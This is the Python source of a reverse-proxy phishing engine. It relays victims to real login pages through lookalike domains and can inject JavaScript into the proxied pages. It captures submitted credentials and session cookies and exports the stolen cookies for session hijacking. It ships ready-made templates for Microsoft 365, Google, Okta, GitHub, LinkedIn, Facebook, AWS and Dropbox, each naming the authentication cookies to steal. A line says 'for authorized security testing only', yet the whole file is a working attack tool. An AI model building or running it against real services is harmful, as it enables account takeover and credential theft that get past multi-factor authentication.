"""
Reverse Proxy Phishing Engine

A comprehensive reverse proxy for credential and session capture.
This proxies requests to real target sites while capturing:
- Form submissions (credentials)
- Cookies (session tokens)
- Authentication tokens
- Request/response data

For authorized security testing only.
"""

import asyncio
import aiohttp
import ssl
import re
import json
import logging
import uuid
from datetime import datetime
from typing import Dict, List, Optional, Callable, Any, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from aiohttp import web, ClientSession, TCPConnector, CookieJar
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class PhishletConfig:
    """Configuration for a phishlet (target site proxy config)"""
    id: str
    name: str
    target_host: str  # e.g., "login.microsoftonline.com"
    phishing_host: str  # e.g., "login-microsoft.attacker.com"
    target_scheme: str = "https"

    # Capture configuration
    capture_cookies: List[str] = field(default_factory=list)  # Cookie names to capture
    capture_fields: List[str] = field(default_factory=lambda: ["username", "password", "email", "login", "passwd", "user", "pass"])
    auth_tokens: List[str] = field(default_factory=list)  # Token cookie names that indicate auth success

    # URL patterns that indicate successful authentication
    auth_urls: List[str] = field(default_factory=list)

    # Domain replacements for sub-resources
    sub_filters: Dict[str, str] = field(default_factory=dict)

    # Custom JavaScript to inject
    js_inject: Optional[str] = None

    # Status
    is_active: bool = False
    listen_port: int = 8443

    # SSL
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None


@dataclass
class CapturedSession:
    """Captured session data from a victim"""
    id: str
    phishlet_id: str
    victim_ip: str
    user_agent: str
    created_at: str

    # Captured data
    cookies: Dict[str, str] = field(default_factory=dict)
    credentials: Dict[str, str] = field(default_factory=dict)
    tokens: Dict[str, str] = field(default_factory=dict)

    # Request log
    requests: List[Dict] = field(default_factory=list)

    # Auth status
    authenticated: bool = False
    authenticated_at: Optional[str] = None

    # Landing URL
    landing_url: Optional[str] = None


class ProxyEngine:
    """
    Core reverse proxy engine for phishing attacks.

    Features:
    - Transparent reverse proxying
    - Cookie/credential capture
    - HTML/JS rewriting for domain replacement
    - Session tracking
    - Authentication detection
    """

    def __init__(self):
        self.phishlets: Dict[str, PhishletConfig] = {}
        self.sessions: Dict[str, CapturedSession] = {}
        self.active_servers: Dict[str, web.AppRunner] = {}
        self._client_session: Optional[ClientSession] = None
        self._callbacks: Dict[str, List[Callable]] = {
            'on_credentials': [],
            'on_session': [],
            'on_auth': [],
        }

    async def init(self):
        """Initialize the proxy engine"""
        # Create a client session with permissive SSL (for self-signed certs on targets)
        connector = TCPConnector(ssl=False, limit=100)
        self._client_session = ClientSession(
            connector=connector,
            cookie_jar=CookieJar(unsafe=True),
            timeout=aiohttp.ClientTimeout(total=30)
        )
        logger.info("Proxy engine initialized")

    async def cleanup(self):
        """Cleanup resources"""
        if self._client_session:
            await self._client_session.close()

        # Stop all active servers
        for phishlet_id in list(self.active_servers.keys()):
            await self.stop_phishlet(phishlet_id)

    def register_callback(self, event: str, callback: Callable):
        """Register a callback for events (on_credentials, on_session, on_auth)"""
        if event in self._callbacks:
            self._callbacks[event].append(callback)

    async def _emit(self, event: str, data: Any):
        """Emit an event to all registered callbacks"""
        for callback in self._callbacks.get(event, []):
            try:
                if asyncio.iscoroutinefunction(callback):
                    await callback(data)
                else:
                    callback(data)
            except Exception as e:
                logger.error(f"Callback error for {event}: {e}")

    def add_phishlet(self, config: PhishletConfig) -> str:
        """Add a phishlet configuration"""
        self.phishlets[config.id] = config
        logger.info(f"Added phishlet: {config.name} ({config.target_host} -> {config.phishing_host})")
        return config.id

    def remove_phishlet(self, phishlet_id: str):
        """Remove a phishlet"""
        if phishlet_id in self.phishlets:
            del self.phishlets[phishlet_id]

    def get_phishlet(self, phishlet_id: str) -> Optional[PhishletConfig]:
        """Get a phishlet by ID"""
        return self.phishlets.get(phishlet_id)

    def _get_or_create_session(self, phishlet_id: str, request: web.Request) -> CapturedSession:
        """Get or create a session for a visitor"""
        # Use a combination of IP and a tracking cookie for session identification
        victim_ip = request.remote or "unknown"
        session_cookie = request.cookies.get('_px_session')

        if session_cookie and session_cookie in self.sessions:
            return self.sessions[session_cookie]

        # Create new session
        session_id = str(uuid.uuid4())[:16]
        session = CapturedSession(
            id=session_id,
            phishlet_id=phishlet_id,
            victim_ip=victim_ip,
            user_agent=request.headers.get('User-Agent', 'unknown'),
            created_at=datetime.now().isoformat(),
            landing_url=str(request.url)
        )
        self.sessions[session_id] = session

        asyncio.create_task(self._emit('on_session', session))
        logger.info(f"New session created: {session_id} from {victim_ip}")

        return session

    def _rewrite_content(self, content: str, phishlet: PhishletConfig, content_type: str) -> str:
        """Rewrite content to replace target domain with phishing domain"""
        if not content:
            return content

        # Only rewrite HTML and JavaScript
        if 'html' not in content_type and 'javascript' not in content_type and 'json' not in content_type:
            return content

        # Replace target host with phishing host
        content = content.replace(phishlet.target_host, phishlet.phishing_host)
        content = content.replace(f"https://{phishlet.target_host}", f"https://{phishlet.phishing_host}")
        content = content.replace(f"http://{phishlet.target_host}", f"https://{phishlet.phishing_host}")

        # Apply sub-filters for related domains
        for target_domain, phishing_domain in phishlet.sub_filters.items():
            content = content.replace(target_domain, phishing_domain)
            content = content.replace(f"https://{target_domain}", f"https://{phishing_domain}")
            content = content.replace(f"http://{target_domain}", f"https://{phishing_domain}")

        # Inject custom JS if configured
        if phishlet.js_inject and 'html' in content_type:
            inject_script = f"<script>{phishlet.js_inject}</script>"
            # Inject before </head> or at start of <body>
            if '</head>' in content:
                content = content.replace('</head>', f"{inject_script}</head>")
            elif '<body' in content:
                content = re.sub(r'(<body[^>]*>)', rf'\1{inject_script}', content, count=1)

        return content

    def _extract_credentials(self, data: Dict[str, Any], phishlet: PhishletConfig) -> Dict[str, str]:
        """Extract credentials from form data"""
        credentials = {}

        for key, value in data.items():
            key_lower = key.lower()
            # Check if this field matches any capture patterns
            for field_pattern in phishlet.capture_fields:
                if field_pattern.lower() in key_lower:
                    if isinstance(value, list):
                        value = value[0] if value else ''
                    credentials[key] = str(value)
                    break

        return credentials

    def _check_auth_success(self, session: CapturedSession, phishlet: PhishletConfig,
                           response_url: str, cookies: Dict[str, str]) -> bool:
        """Check if authentication was successful"""
        # Check URL patterns
        for auth_url in phishlet.auth_urls:
            if auth_url in response_url:
                return True

        # Check for auth token cookies
        for token_name in phishlet.auth_tokens:
            if token_name in cookies:
                session.tokens[token_name] = cookies[token_name]
                return True

        # Check if we have both username and password captured, plus session cookies
        has_creds = 'password' in str(session.credentials).lower() or 'passwd' in str(session.credentials).lower()
        has_session = len(session.cookies) > 2  # More than just tracking cookies

        return has_creds and has_session

    async def _handle_request(self, request: web.Request, phishlet: PhishletConfig) -> web.Response:
        """Handle an incoming request and proxy it to the target"""
        # Ensure client session is initialized
        if not self._client_session:
            await self.init()

        session = self._get_or_create_session(phishlet.id, request)

        # Build target URL
        target_url = f"{phishlet.target_scheme}://{phishlet.target_host}{request.path}"
        if request.query_string:
            target_url += f"?{request.query_string}"

        # Prepare headers (filter hop-by-hop headers)
        headers = {}
        hop_by_hop = {'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
                      'te', 'trailers', 'transfer-encoding', 'upgrade', 'host'}

        for key, value in request.headers.items():
            if key.lower() not in hop_by_hop:
                # Rewrite host header
                if key.lower() == 'host':
                    value = phishlet.target_host
                # Rewrite referer/origin
                elif key.lower() in ('referer', 'origin'):
                    value = value.replace(phishlet.phishing_host, phishlet.target_host)
                headers[key] = value

        headers['Host'] = phishlet.target_host

        # Get request body
        body = None
        form_data = {}

        if request.method in ('POST', 'PUT', 'PATCH'):
            content_type = request.content_type or ''

            if 'application/x-www-form-urlencoded' in content_type:
                form_data = dict(await request.post())
                body = urlencode(form_data)

                # Extract credentials
                creds = self._extract_credentials(form_data, phishlet)
                if creds:
                    session.credentials.update(creds)
                    logger.info(f"Captured credentials: {list(creds.keys())} from {session.victim_ip}")
                    await self._emit('on_credentials', {
                        'session': session,
                        'credentials': creds
                    })

            elif 'application/json' in content_type:
                try:
                    json_data = await request.json()
                    form_data = json_data if isinstance(json_data, dict) else {}
                    body = json.dumps(json_data)

                    # Extract credentials from JSON
                    creds = self._extract_credentials(form_data, phishlet)
                    if creds:
                        session.credentials.update(creds)
                        logger.info(f"Captured JSON credentials: {list(creds.keys())}")
                        await self._emit('on_credentials', {
                            'session': session,
                            'credentials': creds
                        })
                except:
                    body = await request.read()
            else:
                body = await request.read()

        # Forward cookies from victim
        cookies = dict(request.cookies)

        try:
            # Make request to target
            async with self._client_session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=body,
                cookies=cookies,
                allow_redirects=False,
                ssl=False
            ) as resp:
                # Get response body
                resp_body = await resp.read()

                # Capture cookies from response
                for cookie in resp.cookies.values():
                    cookie_name = cookie.key
                    cookie_value = cookie.value

                    session.cookies[cookie_name] = cookie_value

                    # Check if this is an important cookie
                    if cookie_name in phishlet.capture_cookies or cookie_name in phishlet.auth_tokens:
                        session.tokens[cookie_name] = cookie_value
                        logger.info(f"Captured token cookie: {cookie_name}")

                # Check for authentication success
                if not session.authenticated:
                    if self._check_auth_success(session, phishlet, str(resp.url), session.cookies):
                        session.authenticated = True
                        session.authenticated_at = datetime.now().isoformat()
                        logger.info(f"Session {session.id} authenticated!")
                        await self._emit('on_auth', session)

                # Rewrite response content
                content_type = resp.content_type or ''
                if resp_body and ('text' in content_type or 'html' in content_type or
                                  'javascript' in content_type or 'json' in content_type):
                    try:
                        charset = resp.charset or 'utf-8'
                        content = resp_body.decode(charset, errors='replace')
                        content = self._rewrite_content(content, phishlet, content_type)
                        resp_body = content.encode(charset)
                    except Exception as e:
                        logger.warning(f"Content rewrite failed: {e}")

                # Build response headers
                resp_headers = {}
                skip_headers = {'content-encoding', 'content-length', 'transfer-encoding',
                               'connection', 'keep-alive'}

                for key, value in resp.headers.items():
                    if key.lower() not in skip_headers:
                        # Rewrite location header for redirects
                        if key.lower() == 'location':
                            value = value.replace(phishlet.target_host, phishlet.phishing_host)
                            for target_domain, phishing_domain in phishlet.sub_filters.items():
                                value = value.replace(target_domain, phishing_domain)
                        # Rewrite set-cookie domain
                        elif key.lower() == 'set-cookie':
                            value = value.replace(f"domain={phishlet.target_host}", f"domain={phishlet.phishing_host}")
                            value = value.replace(f"Domain={phishlet.target_host}", f"Domain={phishlet.phishing_host}")
                        resp_headers[key] = value

                # Create response
                response = web.Response(
                    body=resp_body,
                    status=resp.status,
                    headers=resp_headers
                )

                # Set tracking cookie
                response.set_cookie('_px_session', session.id, max_age=86400, httponly=True)

                # Forward cookies from target
                for cookie in resp.cookies.values():
                    response.set_cookie(
                        cookie.key,
                        cookie.value,
                        max_age=cookie.get('max-age'),
                        path=cookie.get('path', '/'),
                        secure=cookie.get('secure', False),
                        httponly=cookie.get('httponly', False)
                    )

                # Log request
                session.requests.append({
                    'timestamp': datetime.now().isoformat(),
                    'method': request.method,
                    'url': target_url,
                    'status': resp.status
                })

                return response

        except aiohttp.ClientError as e:
            logger.error(f"Proxy client error: {e}")
            return web.Response(text=f"Proxy Error: Could not connect to {phishlet.target_host}: {str(e)}", status=502)
        except Exception as e:
            logger.error(f"Proxy error: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            return web.Response(text=f"Proxy Error: {type(e).__name__}: {str(e)}", status=502)

    async def start_phishlet(self, phishlet_id: str, port: int = 8443) -> Dict:
        """Start a phishlet proxy server"""
        phishlet = self.phishlets.get(phishlet_id)
        if not phishlet:
            raise ValueError(f"Phishlet {phishlet_id} not found")

        if phishlet_id in self.active_servers:
            raise ValueError(f"Phishlet {phishlet_id} is already running")

        # Create web app
        app = web.Application()

        # Add catch-all route
        async def handle_all(request):
            return await self._handle_request(request, phishlet)

        app.router.add_route('*', '/{path:.*}', handle_all)

        # Create runner
        runner = web.AppRunner(app)
        await runner.setup()

        # Create site (HTTP for now, SSL would need certificates)
        site = web.TCPSite(runner, '0.0.0.0', port)

        try:
            await site.start()
            self.active_servers[phishlet_id] = runner
            phishlet.is_active = True
            phishlet.listen_port = port

            logger.info(f"Started phishlet {phishlet.name} on port {port}")

            return {
                'status': 'running',
                'phishlet_id': phishlet_id,
                'port': port,
                'proxy_url': f"http://localhost:{port}",
                'message': f"Proxy running. Point {phishlet.phishing_host} DNS to this server."
            }
        except Exception as e:
            await runner.cleanup()
            raise RuntimeError(f"Failed to start phishlet: {e}")

    async def stop_phishlet(self, phishlet_id: str):
        """Stop a running phishlet"""
        if phishlet_id in self.active_servers:
            runner = self.active_servers.pop(phishlet_id)
            await runner.cleanup()

            if phishlet_id in self.phishlets:
                self.phishlets[phishlet_id].is_active = False

            logger.info(f"Stopped phishlet {phishlet_id}")

    def get_sessions(self, phishlet_id: Optional[str] = None) -> List[CapturedSession]:
        """Get captured sessions, optionally filtered by phishlet"""
        sessions = list(self.sessions.values())
        if phishlet_id:
            sessions = [s for s in sessions if s.phishlet_id == phishlet_id]
        return sessions

    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        """Get a specific session"""
        return self.sessions.get(session_id)

    def get_authenticated_sessions(self) -> List[CapturedSession]:
        """Get all authenticated sessions"""
        return [s for s in self.sessions.values() if s.authenticated]

    def export_session_cookies(self, session_id: str, format: str = 'header') -> str:
        """Export session cookies in various formats"""
        session = self.sessions.get(session_id)
        if not session:
            return ""

        if format == 'header':
            return '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
        elif format == 'json':
            return json.dumps(session.cookies, indent=2)
        elif format == 'netscape':
            lines = ["# Netscape HTTP Cookie File"]
            phishlet = self.phishlets.get(session.phishlet_id)
            domain = phishlet.target_host if phishlet else "example.com"
            for name, value in session.cookies.items():
                lines.append(f".{domain}\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
            return '\n'.join(lines)
        else:
            return json.dumps(session.cookies)

    def get_stats(self) -> Dict:
        """Get proxy engine statistics"""
        return {
            'total_phishlets': len(self.phishlets),
            'active_phishlets': len(self.active_servers),
            'total_sessions': len(self.sessions),
            'authenticated_sessions': len(self.get_authenticated_sessions()),
            'total_credentials': sum(len(s.credentials) for s in self.sessions.values()),
            'total_cookies': sum(len(s.cookies) for s in self.sessions.values())
        }


# Global proxy engine instance
proxy_engine = ProxyEngine()


# Pre-built phishlet templates
PHISHLET_TEMPLATES = {
    'microsoft365': PhishletConfig(
        id='microsoft365',
        name='Microsoft 365',
        target_host='login.microsoftonline.com',
        phishing_host='login-microsoft.{YOUR_DOMAIN}',
        capture_cookies=['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'buid', 'esctx'],
        capture_fields=['login', 'loginfmt', 'passwd', 'password', 'username', 'email'],
        auth_tokens=['ESTSAUTHPERSISTENT', 'ESTSAUTH'],
        auth_urls=['/kmsi', '/oauth2/authorize', 'login.microsoft.com'],
        sub_filters={
            'login.microsoft.com': 'login-ms.{YOUR_DOMAIN}',
            'aadcdn.msauth.net': 'cdn-ms.{YOUR_DOMAIN}',
            'logincdn.msauth.net': 'logincdn-ms.{YOUR_DOMAIN}',
        }
    ),
    'google': PhishletConfig(
        id='google',
        name='Google Workspace',
        target_host='accounts.google.com',
        phishing_host='accounts-google.{YOUR_DOMAIN}',
        capture_cookies=['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', '__Secure-1PSID'],
        capture_fields=['identifier', 'Email', 'password', 'Passwd'],
        auth_tokens=['SID', 'HSID', '__Secure-1PSID'],
        auth_urls=['/signin/v2/challenge', 'myaccount.google.com', '/ServiceLogin'],
        sub_filters={
            'www.google.com': 'www-google.{YOUR_DOMAIN}',
            'ssl.gstatic.com': 'ssl-gstatic.{YOUR_DOMAIN}',
        }
    ),
    'okta': PhishletConfig(
        id='okta',
        name='Okta SSO',
        target_host='{COMPANY}.okta.com',
        phishing_host='okta.{YOUR_DOMAIN}',
        capture_cookies=['sid', 'DT', 'JSESSIONID', 'okta-oauth-nonce'],
        capture_fields=['username', 'password', 'identifier'],
        auth_tokens=['sid'],
        auth_urls=['/app/', '/home', '/oauth2/'],
    ),
    'github': PhishletConfig(
        id='github',
        name='GitHub',
        target_host='github.com',
        phishing_host='github.{YOUR_DOMAIN}',
        capture_cookies=['user_session', 'logged_in', '__Host-user_session_same_site', 'dotcom_user'],
        capture_fields=['login', 'password', 'otp'],
        auth_tokens=['user_session', 'logged_in'],
        auth_urls=['/settings', '/dashboard'],
        sub_filters={
            'github.githubassets.com': 'githubassets.{YOUR_DOMAIN}',
        }
    ),
    'linkedin': PhishletConfig(
        id='linkedin',
        name='LinkedIn',
        target_host='www.linkedin.com',
        phishing_host='linkedin.{YOUR_DOMAIN}',
        capture_cookies=['li_at', 'JSESSIONID', 'liap', 'li_mc'],
        capture_fields=['session_key', 'session_password', 'username', 'password'],
        auth_tokens=['li_at', 'liap'],
        auth_urls=['/feed', '/mynetwork', '/messaging'],
        sub_filters={
            'static.licdn.com': 'static-li.{YOUR_DOMAIN}',
        }
    ),
    'facebook': PhishletConfig(
        id='facebook',
        name='Facebook',
        target_host='www.facebook.com',
        phishing_host='facebook.{YOUR_DOMAIN}',
        capture_cookies=['c_user', 'xs', 'datr', 'sb'],
        capture_fields=['email', 'pass', 'login', 'password'],
        auth_tokens=['c_user', 'xs'],
        auth_urls=['/home.php', '/me', '/?sk='],
        sub_filters={
            'static.xx.fbcdn.net': 'static-fb.{YOUR_DOMAIN}',
            'www.facebook.com': 'fb.{YOUR_DOMAIN}',
        }
    ),
    'aws': PhishletConfig(
        id='aws',
        name='AWS Console',
        target_host='signin.aws.amazon.com',
        phishing_host='signin-aws.{YOUR_DOMAIN}',
        capture_cookies=['aws-creds', 'aws-userInfo', 'noflush_awsccc', 'aws-signin-method'],
        capture_fields=['username', 'password', 'account', 'email'],
        auth_tokens=['aws-creds'],
        auth_urls=['/console', '/console/home'],
        sub_filters={
            'console.aws.amazon.com': 'console-aws.{YOUR_DOMAIN}',
        }
    ),
    'dropbox': PhishletConfig(
        id='dropbox',
        name='Dropbox',
        target_host='www.dropbox.com',
        phishing_host='dropbox.{YOUR_DOMAIN}',
        capture_cookies=['t', 'lid', '__Host-js_csrf', 'gvc'],
        capture_fields=['login_email', 'login_password', 'email', 'password'],
        auth_tokens=['t', 'lid'],
        auth_urls=['/home', '/h', '/personal'],
    ),
}


def get_phishlet_template(name: str, your_domain: str, company: str = "company") -> Optional[PhishletConfig]:
    """Get a phishlet template with domain placeholders replaced"""
    import copy

    template = PHISHLET_TEMPLATES.get(name)
    if not template:
        return None

    # Deep copy the template
    phishlet = copy.deepcopy(template)
    phishlet.id = str(uuid.uuid4())[:8]

    # Replace placeholders
    phishlet.phishing_host = phishlet.phishing_host.replace('{YOUR_DOMAIN}', your_domain)
    phishlet.target_host = phishlet.target_host.replace('{COMPANY}', company)

    # Replace in sub_filters
    new_sub_filters = {}
    for k, v in phishlet.sub_filters.items():
        new_k = k.replace('{COMPANY}', company)
        new_v = v.replace('{YOUR_DOMAIN}', your_domain)
        new_sub_filters[new_k] = new_v
    phishlet.sub_filters = new_sub_filters

    return phishlet
